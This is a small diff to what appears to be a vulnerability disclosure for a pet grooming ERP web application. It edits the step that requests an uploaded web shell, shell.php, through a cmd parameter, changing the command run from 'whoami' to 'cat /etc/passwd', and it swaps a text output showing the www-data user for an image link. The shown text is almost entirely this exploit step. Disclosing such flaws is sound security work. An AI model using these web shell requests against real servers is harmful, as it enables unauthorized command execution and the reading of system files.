@@ -56,9 +56,9 @@ Accessible at:
 
 Request the uploaded file with the cmd parameter:
 
-```http://<host>/petgrooming_erp/pet_grooming/assets/uploadImage/Profile/shell.php?cmd=whoami```
-
+```http://<host>/petgrooming_erp/pet_grooming/assets/uploadImage/Profile/shell.php?cmd=cat /etc/passwd```
 
 ### Example Output:
 
-```uid=33(www-data) gid=33(www-data) groups=33(www-data)```
+![](./evidence2.png)
+
